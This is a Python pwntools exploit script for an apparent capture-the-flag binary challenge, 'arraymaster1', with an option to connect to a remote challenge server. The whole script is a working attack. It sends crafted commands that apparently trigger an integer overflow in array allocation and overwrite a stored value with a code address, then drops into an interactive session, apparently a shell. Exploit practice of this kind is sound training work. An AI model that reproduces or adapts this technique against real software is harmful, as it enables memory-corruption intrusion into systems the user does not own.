#!/usr/bin/env python3
from pwn import *

bin_name = "./arraymaster1"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("arraymaster1.challs.cyberchallenge.it", 9125)
    else:
        return process(elf.path)

def main():
    r = conn()
    r.sendlineafter(b'>',b'init A 64 2305843009213693953')
    r.sendlineafter(b'>',b'init B 64 67')
    r.sendlineafter(b'>',b'set A 7 4199298')
    r.sendlineafter(b'>',b'get B 1')
    r.interactive()

if __name__ == "__main__":
    main()
